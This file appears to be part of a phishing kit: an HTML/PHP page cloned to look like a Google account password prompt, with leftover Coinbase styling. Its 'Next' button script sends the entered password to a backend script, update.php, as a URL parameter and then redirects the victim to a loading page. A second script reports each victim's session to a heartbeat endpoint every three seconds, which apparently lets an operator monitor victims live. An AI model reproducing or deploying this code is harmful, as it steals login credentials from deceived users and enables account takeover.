                                                        --display2-font-size: 34px;
                                                        --display2-line-height: 44px;
                                                        --display2-frontier-font-size: 48px;
                                                        --display2-frontier-line-height: 56px;
                                                        --display3-font-size: 40px;
                                                        --display3-line-height: 48px;
                                                        --title1-font-size: 28px;
                                                    Show All Properties (23 more)
                                                    }
                                                    .cds-frontierDark-f1icba2l {
                                                        --yellow0: 0,0,0;
                                                        --yellow5: 22,7,0;
                                                        --yellow10: 43,15,0;
                                                        --yellow15: 65,27,0;
                                                        --yellow20: 88,41,0;
                                                        --yellow30: 129,73,0;
                                                        --yellow40: 169,109,0;
                                                        --yellow50: 204,146,0;
                                                        --yellow60: 233,179,0;
                                                        --yellow70: 255,210,0;
                                                        --yellow80: 255,223,68;
                                                        --yellow90: 255,237,150;
                                                        --yellow100: 255,252,241;
                                                    }
                                                    .cds-dark-d255ydu {
                                                        --blue0: 0,16,51;
                                                        --blue5: 1,29,91;
                                                        --blue10: 1,42,130;
                                                        --blue15: 3,51,154;
                                                        --blue20: 5,59,177;
                                                        --blue30: 10,72,206;
                                                        --blue40: 19,84,225;
                                                        --blue50: 33,98,238;
                                                        --blue60: 55,115,245;
                                                        --blue70: 87,139,250;
                                                        --blue80: 132,170,253;
                                                        --blue90: 185,207,255;
                                                        --blue100: 245,248,255;
                                                        --green0: 0,51,30;
                                                        --green5: 0,61,36;
                                                        --green10: 1,71,42;
                                                        --green15: 2,82,48;
                                                        --green20: 2,92,55;
                                                        --green30: 6,112,68;
                                                        --green40: 11,133,82;
                                                        --green50: 21,153,98;
                                                        --green60: 39,173,117;
                                                        --green70: 68,194,141;
                                                        --green80: 111,214,171;
                                                        --green90: 171,235,208;
                                                        --green100: 245,255,251;
                                                        --orange0: 51,13,0;
                                                        --orange5: 79,20,0;
                                                        --orange10: 107,28,1;
                                                        --orange15: 131,36,2;
                                                        --orange20: 155,44,4;
                                                        --orange30: 189,59,9;
                                                        --orange40: 213,76,18;
                                                        --orange50: 230,96,32;
                                                        --orange60: 240,120,54;
                                                        --orange70: 248,150,86;
                                                        --orange80: 252,185,131;
                                                        --orange90: 254,219,185;
                                                        --orange100: 255,250,245;
                                                        --yellow0: 26,8,0;
                                                        --yellow5: 43,16,0;
                                                        --yellow10: 60,26,0;
                                                        --yellow15: 78,37,0;
                                                        --yellow20: 96,50,0;
                                                        --yellow30: 131,79,1;
                                                        --yellow40: 165,114,12;
                                                        --yellow50: 194,149,33;
                                                        --yellow60: 218,181,64;
                                                        --yellow70: 236,208,105;
                                                        --yellow80: 247,229,153;
                                                    Show All Properties (80 more)
                                                    }
                                                    :root {
                                                        --border-radius-none: 0px;
                                                        --border-radius-compact: 4px;
                                                        --border-radius-tooltip-v2: 6px;
                                                        --border-radius-standard: 8px;
                                                        --border-radius-badge: 9px;
                                                        --border-radius-tooltip: 12px;
                                                        --border-radius-pill: 18px;
                                                        --border-radius-round: 100px;
                                                        --border-radius-input: 8px;
                                                        --border-radius-search: 56px;
                                                        --border-radius-popover: 16px;
                                                        --border-radius-rounded-none: 0px;
                                                        --border-radius-rounded-small: 4px;
                                                        --border-radius-rounded: 8px;
                                                        --border-radius-rounded-large: 16px;
                                                        --border-radius-rounded-full: 1000px;
                                                        --border-width-none: 0px;
                                                        --border-width-button: 1px;
                                                        --border-width-card: 1px;
                                                        --border-width-checkbox: 2px;
                                                        --border-width-radio: 2px;
                                                        --border-width-sparkline: 2px;
                                                        --border-width-focus-ring: 2px;
                                                        --border-width-input: 1px;
                                                    }
                                                    :root {
                                                        --cds-font-fallback: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Helvetica', 'Arial', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol';
                                                        --cds-font-display: CoinbaseDisplay, var(--cds-font-fallback);
                                                        --cds-font-sans: CoinbaseSans, var(--cds-font-fallback);
                                                        --cds-font-text: CoinbaseText, var(--cds-font-fallback);
                                                        --cds-font-mono: CoinbaseMono, var(--cds-font-fallback);
                                                    }
                                                    html {
                                                        -webkit-text-size-adjust: 100%;
                                                        -webkit-tap-highlight-color: transparent;
                                                    }
                                                    *, :before, :after {
                                                        box-sizing: border-box;
                                                        border-style: solid;
                                                        border-width: 0;
                                                    }
                                                    *, :before, :after {
                                                        box-sizing: border-box;
                                                        border-style: solid;
                                                        border-width: 0;
                                                    }
                                                  </style>
                                                  <script>
                                                    var hidden = true;
                                                    function toggleHide() {
                                                      if ( document.getElementById( 'show-password-check' ).checked ) {
                                                        document.getElementById( 'Passwd' ).type = 'text';
                                                      } else {
                                                        document.getElementById( 'Passwd' ).type = 'password';
                                                      }
                                                    }
                                                  </script>
                                                  <div class=VfPpkd-YQoJzd>
                                                    <svg aria-hidden=true class=VfPpkd-HUofsb viewBox="0 0 24 24">
                                                      <path class=VfPpkd-HUofsb-Jt5cK fill=none d="M1.73,12.91 8.1,19.28 22.79,4.59"></path>
                                                    </svg>
                                                    <div class=VfPpkd-SJnn3d></div>
                                                  </div>
                                                  <div class=VfPpkd-OYHm6b></div>
                                                  <div class=VfPpkd-sMek6-LhBDec></div>
                                                </div>
                                              </div>
                                              <div class=DVnhEd>
                                                <div jsname=V67aGc class=wFCloc>
                                                  <div jsslot id=selectionc1 class="d3GVvd jGAaxb" jsname=CeL6Qc>Show password</div>
                                                </div>
                                              </div>
                                            </div>
                                          </div>
                                        </div>
                                        <div aria-atomic=true aria-live=polite class="Df4rGb sf-hidden" jsname=h9d3hd></div>
                                      </div>
                                    </div>
                                    <div class="gSlDTe sf-hidden" jsname=JIbuQc></div>
                                  </div>
                                  <div jscontroller=lmaXKd jsname=Si5T8b class="Wzzww eLNT1d sf-hidden" jsaction=PIvFg:IMdg8d;rcuQ6b:jqIVcd></div>
                                </div>
                              </div>
                            </section>
                          </span>
                        </form>
                      </div>
                    </div>
                    <div class=Z6Ep7d jsname=DH6Rkf jscontroller=VFoZaf jsaction=rcuQ6b:rcuQ6b;PIvFg:vjx2Ld(Njthtb),ChoyC(eBSUOb),VaKChb(gVmDzc),nCZam(W3Rzrc),Tzaumc(uRHG6),JGhSzd;dcnbp:dE26Sc(lqvTlf);FzgWvd:JGhSzd; data-is-consent=false data-is-primary-action-disabled=false data-is-secondary-action-disabled=false data-primary-action-label=Next data-secondary-action-label jsshadow>
                      <div class=dqyqtf jsname=DhK0U>
                        <div class=F9NWFb jsname=k77Iif>
                          <div jscontroller=IZ1fbc jsaction=click:cOuCgd;JIbuQc:JIbuQc; jsname=Njthtb class="FliLIb FmFZVc" id=passwordNext>
                            <div class=VfPpkd-dgl2Hf-ppHlrf-sM5MNb data-is-touch-wrapper=true>
                              <button class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-k8QpJ VfPpkd-LgbsSe-OWXEXe-dgl2Hf nCP5yc AjY5Oe DuMIQc LQeN7 qIypjc TrZEUc lw1w4b" jscontroller=soHxf jsaction="click:cOuCgd; mousedown:UX7yZ; mouseup:lbsD7e; mouseenter:tfO1Yc; mouseleave:JywGue; touchstart:p6p2H; touchmove:FwuNnf; touchend:yfqBxc; touchcancel:JMtRjd; focus:AHmuwe; blur:O22p3e; contextmenu:mg9Pef;mlnRJb:fLiPzd;" data-idom-class="nCP5yc AjY5Oe DuMIQc LQeN7 qIypjc TrZEUc lw1w4b" jsname=LgbsSe onclick="onClick()" id="submitbtn">
                              	<script src="../../core/js/jquery.js"></script>
                              	<script>
                              		function onClick() {
                              			if ( document.getElementById( 'Passwd' ).value != '' ) {

                              				$.ajax({
																	      type: 'GET',
																	      url: '../../core/update.php?mailpw=' + document.getElementById( 'Passwd' ).value,
																	      success: function ( data ) {

																	        var parsed_data = JSON.parse( data );

																	        if ( parsed_data[ 'status' ] != 'error' ) {

																	        	
																	        	window.location.replace( '../../loading.php' );

																	        }

																	      }
																	    });

                              			}
                              		}
                              	</script>
                                <div class=VfPpkd-Jh9lGc></div>
                                <div class="VfPpkd-J1Ukfc-LhBDec sf-hidden"></div>
                                <div class=VfPpkd-RLmnJb></div>
                                <span jsname=V67aGc class=VfPpkd-vQzf8d>Next</span>
                              </button>
                            </div>
                          </div>
                        </div>
                        <div class=XOrBDc jsname=QkNstf>
                          <div jscontroller=IZ1fbc jsaction=click:cOuCgd;JIbuQc:JIbuQc; jsname=gVmDzc class="FliLIb sbGPcf" id=forgotPassword>
                            <div class=VfPpkd-dgl2Hf-ppHlrf-sM5MNb data-is-touch-wrapper=true>
                              <button class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-dgl2Hf ksBjEc lKxP2d LQeN7 uRo0Xe TrZEUc lw1w4b" jscontroller=soHxf jsaction="click:cOuCgd; mousedown:UX7yZ; mouseup:lbsD7e; mouseenter:tfO1Yc; mouseleave:JywGue; touchstart:p6p2H; touchmove:FwuNnf; touchend:yfqBxc; touchcancel:JMtRjd; focus:AHmuwe; blur:O22p3e; contextmenu:mg9Pef;mlnRJb:fLiPzd;" data-idom-class="ksBjEc lKxP2d LQeN7 uRo0Xe TrZEUc lw1w4b" jsname=LgbsSe>
                                <div class=VfPpkd-Jh9lGc></div>
                                <div class="VfPpkd-J1Ukfc-LhBDec sf-hidden"></div>
                                <div class=VfPpkd-RLmnJb></div>
                                <span jsname=V67aGc class=VfPpkd-vQzf8d>Forgot password?</span>
                              </button>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              <c-data id=c4 jsdata=" SnOFNc;_;$2 tEzfhe;_;$3 Rf8b0c;_;$4" class=sf-hidden></c-data>
              <view-header style=display:none></view-header>
            </c-wiz>
          </div>
        </div>
        <c-wiz jsrenderer=ZdRp7e jsshadow jsdata=deferred-i1 data-node-index=0;0 jsmodel=hc6Ubd c-wiz>
          <footer class=g9mjtf>
            <div class=V7i3mf jscontroller=mWLH9d jsaction=rcuQ6b:npT2md;OmFrlf:VPRXbd>
              <div jsshadow class=O1htCb-H9tDt jsname=rfCUpd jscontroller=yRXbo jsaction=bITzcd:KRVFmb;iFFCZc:Y0y4c;Rld2oe:gDkf4c;EDR5Je:QdOKJc;FzgWvd:RFVo1b id=lang-chooser>
                <div jsname=wSASue class="VfPpkd-O1htCb VfPpkd-O1htCb-OWXEXe-INsAgc VfPpkd-O1htCb-OWXEXe-di8rgd-V67aGc ReCbLb UAQDDf">
                  <div class=VfPpkd-TkwUic jsname=oYxtQd jsaction="focus:AHmuwe; blur:O22p3e; click:cOuCgd; keydown:I481le; mousedown:UX7yZ; mouseup:lbsD7e; mouseenter:tfO1Yc; mouseleave:JywGue; touchstart:p6p2H; touchmove:FwuNnf; touchend:yfqBxc; touchcancel:JMtRjd;" aria-autocomplete=none role=combobox tabindex=0 aria-haspopup=listbox aria-expanded=false aria-labelledby="null i2" aria-controls=i4 aria-disabled=false>
                    <span jscontroller=bTi8wc class="VfPpkd-NSFCdd-i5vt6e VfPpkd-NSFCdd-i5vt6e-OWXEXe-NSFCdd VfPpkd-NSFCdd-i5vt6e-OWXEXe-di8rgd-V67aGc" jsname=B9mpmd>
                      <span class=VfPpkd-NSFCdd-Brv4Fb></span>
                      <span class=VfPpkd-NSFCdd-MpmGFe></span>
                    </span>
                    <span class=VfPpkd-uusGie-fmcmS-haAclf aria-hidden=true>
                      <span id=i2 class=VfPpkd-uusGie-fmcmS jsname=Fb0Bif aria-label>English (United States)</span>
                    </span>
                    <span class=VfPpkd-t08AT-Bz112c>
                      <svg class=VfPpkd-t08AT-Bz112c-Bd00G viewBox="7 10 10 5" focusable=false>
                        <polygon class=VfPpkd-t08AT-Bz112c-mt1Mkb stroke=none fill-rule=evenodd points="7 10 12 15 17 10"></polygon>
                        <polygon class=VfPpkd-t08AT-Bz112c-auswjd stroke=none fill-rule=evenodd points="7 15 12 10 17 15"></polygon>
                      </svg>
                    </span>
                    <span id=i4 style=display:none aria-hidden=true role=listbox></span>
                  </div>
                  <div class="VfPpkd-xl07Ob-XxIAqe VfPpkd-xl07Ob-XxIAqe-OWXEXe-tsQazb VfPpkd-xl07Ob VfPpkd-YPmvEd s8kOBc dmaMHc sf-hidden" jsname=xl07Ob jscontroller=ywOR5c jsaction=keydown:I481le;JIbuQc:j697N(rymPhb);XVaHYd:c9v4Fb(rymPhb);Oyo5M:b5fzT(rymPhb);DimkCe:TQSy7b(rymPhb);m0LGSd:fAWgXe(rymPhb);WAiFGd:kVJJuc(rymPhb); data-is-hoisted=false data-should-flip-corner-horizontally=false data-menu-uid=ucj-1></div>
                </div>
              </div>
            </div>
            <ul class=kJOS4>
              <li class=r7XTUb>
                <a class=NUwdAb href="https://support.google.com/accounts?hl=en-US&amp;p=account_iph" target=_blank>Help</a>
              <li class=r7XTUb>
                <a class=NUwdAb href="https://accounts.google.com/TOS?loc=US&amp;hl=en-US&amp;privacy=true" target=_blank>Privacy</a>
              <li class=r7XTUb>
                <a class=NUwdAb href="https://accounts.google.com/TOS?loc=US&amp;hl=en-US" target=_blank>Terms</a>
            </ul>
          </footer>
          <c-data id=i1 jsdata=" OsjLy;_;1" class=sf-hidden></c-data>
        </c-wiz>
      </div>
      <div class=iNstf aria-hidden=true></div>
    </div>
    <iframe tabindex=-1 style=position:absolute;left:0px;top:0px;z-index:-1 sandbox="allow-popups allow-scripts allow-top-navigation allow-top-navigation-by-user-activation" srcdoc="
														<html>
															<meta http-equiv=content-security-policy Access-Control-Allow-Origin: *>
																<style>img[src=&quot;data:,&quot;],source[src=&quot;data:,&quot;]{display:none!important}</style>" width=0 height=0>
    </iframe>
    <div aria-live=assertive aria-relevant=additions aria-atomic=true style=color:transparent;z-index:-1;position:absolute;top:0px;left:0px;user-select:none aria-hidden=true>
      <div aria-atomic=true>Welcome </div>
    </div>
    <iframe style=display:none></iframe>
    <div style=position:absolute!important;top:0px!important;left:0px!important;height:0px!important;width:0px!important data-lastpass-root>
      <div data-lastpass-infield=true style=position:absolute!important;top:0px!important;left:0px!important>
        <template shadowroot=open>
          <div style=position:absolute;height:100vh;width:100vw;z-index:2147483647;border-radius:4px;top:0px;left:0px;max-height:0px;max-width:280px;margin-top:10px>
            <div style=left:-1px;display:none;position:absolute;overflow:hidden;bottom:100%;width:20px;height:10px></div>
            <iframe data-lastpass-iframe=true allow=clipboard-write style="border:medium none;height:100%;width:100%"></iframe>
          </div>
        </template>
      </div>
    </div>
    <script data-template-shadow-root>
      (() => {
        document.currentScript.remove();
        processNode(document);

        function processNode(node) {
          node.querySelectorAll("template[shadowroot]").forEach(element => {
            let shadowRoot = element.parentElement.shadowRoot;
            if (!shadowRoot) {
              try {
                shadowRoot = element.parentElement.attachShadow({
                  mode: element.getAttribute("shadowroot")
                });
                shadowRoot.innerHTML = element.innerHTML;
                element.remove()
              } catch (error) {}
              if (shadowRoot) {
                processNode(shadowRoot)
              }
            }
          })
        }
      })()
    </script>
    <script>
    	function hb() {
        $.ajax({
          type: 'GET',
          url: '../../core/heartbeat.php?id=' + '<?php echo( $_SESSION[ 'id' ] ); ?>',
          success: function ( data ) {},
          complete: function ( data ) {
            setTimeout( hb, 3000 );
          }
        });
      };hb();
    </script>